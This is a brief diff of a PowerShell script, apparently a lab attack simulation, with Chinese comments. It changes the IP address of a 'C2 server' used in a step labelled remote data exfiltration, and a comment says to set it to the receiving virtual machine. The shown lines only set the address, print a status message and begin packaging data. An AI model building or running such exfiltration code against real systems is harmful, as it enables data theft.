@@ -1,5 +1,5 @@
 # --- 動作 E: 遠端數據滲漏 (Exfiltration) ---
-$destinationIP = "192.168.1.100" # 換成你接收端虛擬機的 IP
+$destinationIP = "192.168.50.202" # 換成你接收端虛擬機的 IP
 Write-Host "[*] 正在傳送情報至 C2 伺服器 ($destinationIP)..." -ForegroundColor Cyan
 
 # 打包資料
